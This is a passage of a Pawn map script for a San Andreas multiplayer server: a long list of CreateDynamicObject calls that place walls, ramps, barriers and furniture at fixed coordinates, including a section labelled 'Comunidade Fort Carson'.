	CreateDynamicObject(983, 1329.39185, -1270.85400, 14.22680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1332.56226, -1267.64661, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.56226, -1261.25232, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.56226, -1254.85205, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.56226, -1248.45581, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.56226, -1242.05408, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.56226, -1235.65161, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.56226, -1229.25024, 14.22680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1229.25452, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1226.05847, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1222.85364, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1219.65210, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1216.45056, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1213.24719, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1210.04492, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1206.86328, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1203.70105, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1200.49561, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1197.29639, 17.56370,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1330.68921, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1327.48499, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1324.27197, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1321.07446, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1317.88037, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1314.68823, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1311.50391, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1308.33447, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1305.12256, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1301.93518, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1298.72266, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1295.55554, -1230.77649, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1294.13110, -1230.77747, 17.56370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1332.36230, -1227.59021, 19.95590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.36230, -1221.22058, 19.95590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.36230, -1214.80969, 19.95590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.36230, -1208.39038, 19.95590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.36230, -1201.98804, 19.95590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.36230, -1198.96582, 19.95590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1329.15515, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1322.75317, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1316.33313, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1309.92126, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1303.52917, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1297.11768, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1295.53381, -1230.77649, 19.95590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1332.36230, -1193.94287, 17.94564,   10.20000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1190.78479, 18.52153,   10.20000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1187.63416, 19.08660,   10.20000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.36230, -1184.48877, 19.65190,   10.20000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.42078, -1181.39673, 20.21600,   10.20000, 0.00000, -1.92000);
	CreateDynamicObject(19364, 1332.52148, -1178.24695, 20.78600,   10.20000, 0.00000, -1.92000);
	CreateDynamicObject(19364, 1332.62878, -1175.09949, 21.35600,   10.20000, 0.00000, -1.92000);
	CreateDynamicObject(19364, 1332.72559, -1171.94861, 21.92600,   10.20000, 0.00000, -1.92000);
	CreateDynamicObject(19364, 1332.76563, -1169.07935, 22.18600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.76563, -1165.89429, 22.18600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.76563, -1162.70251, 22.18600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1332.76563, -1160.88660, 22.18600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1331.25110, -1159.36682, 22.18600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1328.05249, -1159.36682, 22.18600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1324.85376, -1159.36682, 22.18600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1321.65283, -1159.36682, 22.18600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1318.45105, -1159.36682, 22.18600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1332.36230, -1192.50537, 20.61426,   10.20000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.36230, -1186.21411, 21.74090,   10.20000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.47900, -1179.91602, 22.88050,   10.20000, 0.00000, -1.92000);
	CreateDynamicObject(983, 1332.68591, -1173.98022, 23.96050,   10.20000, 0.00000, -1.92000);
	CreateDynamicObject(983, 1332.76563, -1167.50891, 24.49880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1332.76563, -1162.55066, 24.49880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1329.56287, -1159.38342, 24.49880,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1323.15088, -1159.38342, 24.49880,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1318.35559, -1159.36682, 24.49880,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1256.17224, -1159.19250, 24.53868,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1252.98584, -1159.19250, 24.53870,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1254.76965, -1159.19250, 26.93230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19364, 1226.12354, -1269.07947, 11.91870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1265.91345, 12.14870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1262.70898, 12.37870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1259.50659, 12.60870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1256.30957, 12.83870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1253.11047, 13.06870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1249.91455, 13.29870,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1246.69104, 13.57870,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1243.50134, 13.90510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1240.32056, 14.23510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1237.13782, 14.56510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1233.96057, 14.89510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1230.78796, 15.22510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1227.60815, 15.55510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1224.43250, 15.88510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1221.25208, 16.21510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1218.06555, 16.54510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1214.88770, 16.87510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1211.71155, 17.20510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1208.53955, 17.53510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1205.35803, 17.86510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1202.17505, 18.19510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1198.99255, 18.52510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1195.80725, 18.85510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1192.63525, 19.18510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1189.44360, 19.51510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1186.27515, 19.84510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1183.09583, 20.17510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1179.91626, 20.50510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1176.72351, 20.83510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(19364, 1226.12354, -1173.54895, 21.16510,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1267.61438, 14.42610,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1261.23218, 14.88610,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1254.84595, 15.34370,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1251.71899, 15.56738,   4.14000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1245.33984, 16.12700,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1238.97876, 16.76690,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1232.62903, 17.42690,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1226.24841, 18.08690,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1219.88770, 18.74690,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1213.52734, 19.38470,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1207.15308, 20.04460,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1200.79980, 20.68450,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1194.45276, 21.32365,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1188.11694, 21.96273,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1181.79395, 22.60252,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1226.12354, -1175.45105, 23.24208,   5.88000, 0.00000, 0.00000);
	CreateDynamicObject(4639, 1249.34460, -1269.89746, 14.24840,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(4639, 1268.55518, -1269.89746, 14.24840,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1374, 1251.86609, -1270.53333, 13.51310,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(966, 1251.46826, -1270.52075, 12.55760,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(966, 1266.39294, -1270.52075, 12.55760,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1374, 1265.97388, -1270.53333, 13.51310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1258.74036, -1265.46826, 15.04860,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 1258.74036, -1254.46008, 15.04860,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1290, 1258.94751, -1259.98450, 18.39320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 1264.39990, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1275.13660, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1258.94751, -1249.02600, 18.39320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1290, 1269.78528, -1249.02600, 18.39320,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1285.94653, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1296.48413, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1307.18506, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1318.09485, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1280.56848, -1249.02600, 18.39320,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1291.21179, -1249.02600, 18.39320,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1301.86890, -1249.02600, 18.39320,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1312.63696, -1249.02600, 18.39320,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1253.49023, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1242.53003, -1249.21008, 15.04860,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1248.01685, -1249.02600, 18.39320,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1241.08850, -1230.15527, 20.36680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1241.08850, -1230.15527, 14.78001,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1258.88635, -1230.15527, 20.36680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1272.04639, -1230.15149, 20.36680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1285.18469, -1230.15527, 20.36680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1258.88635, -1230.15527, 14.77069,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1272.04639, -1230.15149, 14.77930,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1285.18469, -1230.15527, 14.78474,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1291.73669, -1211.24072, 20.36680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3851, 1285.18774, -1204.70825, 20.36680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 1272.03015, -1204.70825, 20.36680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18980, 1234.10535, -1189.59802, 9.91920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18980, 1234.10303, -1230.36438, 4.37610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3850, 1237.16296, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1240.62451, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1244.08569, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1247.54675, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1250.99695, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1254.44434, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1257.89478, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1261.35681, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1264.81775, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1268.27783, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1271.73865, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1275.19629, -1223.64136, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1278.65881, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1282.10730, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1285.55457, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3850, 1289.03467, -1223.65125, 18.85850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1271.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1275.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1279.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1283.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1287.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1291.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1295.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1299.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1303.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1307.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1311.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1315.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1319.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1323.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1327.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1331.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1331.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1327.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1323.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1319.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1315.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1311.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1307.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1303.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1299.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1295.00000, -1235.94873, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1246.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1242.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1238.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1234.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1230.00000, -1265.79944, 11.80910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1242.53149, -1180.71350, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1253.80298, -1180.71350, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1264.88086, -1180.71350, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1276.08813, -1180.71350, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1281.27417, -1186.01123, 20.95820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 1287.16907, -1191.36316, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1298.23743, -1191.36316, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1597, 1309.43506, -1191.36316, 20.95820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1236.99048, -1180.58032, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1248.17676, -1180.58032, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1259.33582, -1180.58032, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1270.45618, -1180.58032, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1281.57422, -1180.58032, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1281.57422, -1191.13586, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1292.72266, -1191.13586, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1303.85010, -1191.13586, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1290, 1314.78516, -1191.13586, 24.21430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1293.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1297.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1301.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1305.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1309.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1313.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1317.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1321.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1325.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1329.58948, -1225.53784, 17.63610,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2065, 1235.95056, -1214.63196, 12.78340,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2008, 1238.56995, -1214.62134, 12.77910,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2008, 1236.94141, -1217.68323, 12.77910,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2065, 1235.95056, -1215.43201, 12.78340,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1714, 1236.31641, -1216.73486, 12.79469,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 1237.76575, -1215.22412, 12.79470,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1713, 1235.95386, -1226.53125, 12.77310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1713, 1235.95386, -1223.93237, 12.77310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1239.75256, -1214.75793, 12.79570,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1236.47522, -1218.76038, 12.79570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(646, 1235.67493, -1227.42444, 14.15836,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(646, 1235.67493, -1221.39526, 14.15840,   0.00000, 0.00000, 0.00000);
	// Comunidade Fort Carson
	CreateDynamicObject(8661, -265.65265, 993.33838, 18.73920, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, -265.63528, 998.46924, 18.73920, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, -255.46916, 998.45825, 18.73920, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, -254.03856, 986.74591, 18.73920, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, -258.77628, 1008.39844, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1491, -259.56696, 1008.40875, 18.69320, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, -261.91193, 1008.40112, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -265.04999, 1008.39850, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -268.17004, 1008.41626, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, -271.32214, 1008.41492, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -274.52994, 1008.40417, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -277.71341, 1008.40607, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -284.00018, 1008.40057, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, -280.87958, 1008.41235, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -255.57381, 1008.39496, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -252.53786, 1008.39136, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -251.03256, 1006.71631, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -251.04333, 1003.51312, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, -261.75635, 1008.44501, 20.46760, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, -271.44037, 1008.48767, 20.46760, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, -280.79868, 1008.44965, 20.46760, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, -251.04138, 1000.30341, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, -251.03839, 990.82074, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -251.03696, 997.13397, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -251.04437, 993.94928, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -251.04050, 987.66382, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -251.03398, 984.96271, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -255.90538, 983.44147, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -259.06693, 983.44293, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -265.37161, 983.46100, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, -262.19257, 983.45721, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, -262.08017, 983.39996, 20.46760, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -268.55908, 983.45563, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, -271.69769, 983.44440, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, -271.88434, 983.51343, 20.46760, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19404, -281.05231, 983.44977, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -274.72357, 983.44336, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -277.91977, 983.43958, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -283.97574, 983.44592, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, -281.27090, 983.38550, 20.46760, 0.00000, 0.00000, 90.00000);
